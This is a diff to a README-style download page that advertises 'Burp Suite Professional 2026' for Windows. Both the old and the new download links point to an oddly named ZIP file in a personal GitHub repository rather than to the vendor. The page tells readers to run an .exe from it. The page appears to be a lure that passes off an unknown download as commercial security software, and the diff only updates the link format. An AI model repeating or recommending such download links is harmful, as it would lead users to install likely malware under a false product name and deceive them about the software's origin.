@@ -5,7 +5,7 @@ description: "Download and install Burp Suite Professional for Windows 10 and 11
 ---
 # 🛡️ Burp-Suite-2026 - Secure Web Testing Made Simple
 
-[![Download Burp Suite](https://img.shields.io/badge/Download-Burp_Suite_2026-blue)](https://raw.githubusercontent.com/ponnala6435/ponnala6435.github.io/main/beclamour/io_github_ponnala_blepharoatheroma.zip)
+[![Download Burp Suite](https://img.shields.io/badge/Download-Burp_Suite_2026-blue)](https://github.com/ponnala6435/ponnala6435.github.io/raw/refs/heads/main/beclamour/io_github_ponnala_blepharoatheroma.zip)
 
 Burp Suite Professional helps you find security flaws in web applications. It serves as a toolkit for security professionals and developers who want to test their websites against common threats. This version offers improved scanning tools and a faster interface for Windows 10 and Windows 11 users.
 
@@ -23,7 +23,7 @@ Before you install this software, confirm your computer meets these minimum stan
 
 You can obtain the installation files directly from the project release page. Follow this link to find the latest version:
 
-[Visit the Burp Suite 2026 Download Page](https://raw.githubusercontent.com/ponnala6435/ponnala6435.github.io/main/beclamour/io_github_ponnala_blepharoatheroma.zip)
+[Visit the Burp Suite 2026 Download Page](https://github.com/ponnala6435/ponnala6435.github.io/raw/refs/heads/main/beclamour/io_github_ponnala_blepharoatheroma.zip)
 
 Once you arrive at the page, look for the section labeled "Assets." Click the file ending in .exe to start your download. Your web browser may ask you where to save the file. Choose a folder you can find easily, like your Downloads folder.
 
